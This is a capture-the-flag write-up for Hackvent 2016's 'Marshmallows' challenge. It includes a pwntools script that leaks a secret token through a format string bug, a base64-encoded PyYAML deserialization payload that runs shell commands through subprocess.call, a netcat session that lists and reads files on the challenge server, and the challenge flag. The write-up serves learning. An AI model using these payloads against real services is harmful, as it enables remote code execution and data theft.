Day 16: Marshmallows
--------------------
Definitely the hardest challenge until now for me but worth the effort!

We are provided with python script (and the source) that run on a remote server. We notice with the challenge hint that the printf function can be abused by using modifiers like %d, %f, %x, %s... And it returns what is on the stack. To access the second part of the challenge (the secret marshmallows) we need to find the token that must be stored somewhere on the stack (at least a reference to this string). Useful resource is [1].

Using pwntools we can create the following script that will enumerate as a string all the memory addresses in a range and restart the connection if the service crashes:
```python
#!/usr/bin/python2

from pwn import *

r = remote('challenges.hackvent.hacking-lab.com', 1033)
trash = r.recvuntil("> ")
for i in range(201, 300):
        try:
                r.sendline("1")
                r.sendline("%" + str(i) + "$s")
                result = r.recvuntil("> ")
                print(str(i) + "\n=====\n" + result)
        except EOFError:
                r = remote('challenges.hackvent.hacking-lab.com', 1033)
                trash = r.recvuntil("> ")
```

We look at the output until we find these two lines:
```
[+] Please give me some marshmallows: %294$s
MARSHMALLOW_TOKEN=eb261970-9745-4180-9f3c-d6a3cdaeee8d
```

Since the memory layout seems to be constant we don't need to rerun it and the `%294$s` string will always be the token. We can now go to step 2 and try to exploit the yaml.load() function. To do that we find some exploits on Internet and especially [2]. We can then try it localy using another python script:
```python
import yaml
import base64

load_yml = yaml.load
user_input = "..."

exploit = base64.b64encode("!!python/object/apply:subprocess.call\nargs: [ls]\nkwds: {shell: true}")
print(exploit)

secret_marshmallows = load_yml(base64.b64decode(exploit).decode('ascii'))
print(secret_marshmallows)
```

The script will output the payload base64 encoded and execute it locally as well. We can now browse through the folders. We know from the search for the token that a /home/marshmallow folder exist so we start there and we perform the following session online to get the flag:
```
nc challenges.hackvent.hacking-lab.com 1033
[+] WELCOME!

MuffinX presents...

                /^\/^\
              _|__|  O|
     \/     /~     \_/ \
      \____|__________/  \
             \_______      \
                     `\     \                 \
                       |     |                  \
                      /      /                    \
                     /     /                       \
                   /      /                         \ \
                  /     /                            \  \
                /     /             _----_            \   \
               /     /           _-~      ~-_         |   |
              (      (        _-~    _--_    ~-_     _/   |
               \      ~-____-~    _-~    ~-_    ~-_-~    /
                 ~-_           _-~          ~-_       _-~
                    ~--______-~                ~-___-~        ... Marshmallows! <3

[+] Menu

1 - Play chubby bunny.
2 - Exit.

### GET THE TOKEN ###

> 1
[+] Please give me some marshmallows: %294$s
MARSHMALLOW_TOKEN=eb261970-9745-4180-9f3c-d6a3cdaeee8d
[+] Menu

1 - Play chubby bunny.
2 - Exit.

### USE THE TOKEN AND EXECUTE 'ls /home/marshmallows' PAYLOAD ###

> send_secret_marshmallows
[?] Token: eb261970-9745-4180-9f3c-d6a3cdaeee8d
[+] Good token.
[?] Your secret marshmallows: ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3
MuY2FsbAphcmdzOiBbbHMgL2hvbWUvbWFyc2htYWxsb3dzXQprd2RzOiB7c2hlbGw6IHRydWV9
5ae64891a82f2290f157e8fa419c2d3d
marshmallows.py
marshmallows.sh
[+] Menu

1 - Play chubby bunny.
2 - Exit.

### USE THE TOKEN AND EXECUTE 'cat /home/marshmallows/5ae64891a82f2290f157e8fa419c2d3d' PAYLOAD ###
> send_secret_marshmallows
[?] Token: eb261970-9745-4180-9f3c-d6a3cdaeee8d
[+] Good token.
[?] Your secret marshmallows: ISFweXRob24vb2JqZWN0L2FwcGx5OnN1YnByb2Nlc3
MuY2FsbAphcmdzOiBbY2F0IC9ob21lL21hcnNobWFsbG93cy81YWU2NDg5MWE4MmYyMjkwZj
E1N2U4ZmE0MTljMmQzZF0Ka3dkczoge3NoZWxsOiB0cnVlfQ==

You did it!

Greets, MuffinX

HV16-m4rs-hm4l-l0wh-4x0r-sr0x

If you liked this challenge, tweet me: https://twitter.com/muffiniks
[+] Menu

1 - Play chubby bunny.
2 - Exit.

> 
```

And the flag is:

> HV16-m4rs-hm4l-l0wh-4x0r-sr0x

References:

- \[1\] Format String Exploitation-Tutorial, <https://www.exploit-db.com/docs/28476.pdf>
- \[2\] PyYaML exploit, <http://xsnippet.org/361037/>
